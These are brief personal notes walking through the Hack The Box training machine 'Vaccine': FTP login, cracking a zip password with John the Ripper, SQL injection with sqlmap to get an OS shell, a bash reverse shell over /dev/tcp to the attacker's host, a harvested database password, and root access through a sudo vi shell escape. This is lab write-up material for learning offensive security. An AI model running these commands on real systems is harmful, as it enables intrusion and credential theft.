# Hack The Box : Starting Point : Vaccine
```
export ip = 10.10.10.46
```

## SCAN
```
1. 21 FTP
2. 80 HTTP 
```

## FTP
```
[FTP CREDENTIAL] : ftpuser / mc@F1l3ZilL4

1. FTP FILE  :  backup.zip

2. crack the zip file
-- zip2john backup.zip > hash
-- john hash --wordlist=rockyou.txt --fork=4
Zip File Password is : 741852963

3. unzip backup.zip
-- username : admin
-- password : 2cb42f8734ea607eefed3b70af13bbd3 (Decrypt : qwerty789)
```

## Gaining Access
```
What is Point? : Board page --> sqlmap?

[SQLMAP LOG FILE PATH]
: /Users/scops/.local/share/sqlmap/output
: /System/Volumes/Data/Users/scops/.local/share/sqlmap/output/

1. sudo sqlmap -u "http://10.10.10.46/dashboard.php?search=a" --cookie={document.cookie}

2. sudo sqlmap -u "http://10.10.10.46/dashboard.php?search=a" --cookie={document.cookie} --os-shell
[NOTES]
if you are stuck in "--os-shell" change cookie value and retry!

[REVERSE SHELL COMMAND]
4. bash -c 'bash -i >& /dev/tcp/{MY_IP}/4444 0>&1'
```

## Credential
```
1. /var/www/html/dashboard.php
--> port=5432 
    dbname=carsdb 
    user=postgres 
    password=P@s5w0rd!
```

## Privilige Escalate
```
1. python3 -c "import pty;pty.spawn('/bin/bash')"
2. sudo -l
--> /bin/vi /etc/postgresql/11/main/pg_hba.conf
--> sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
--> :!/bin/bash
```







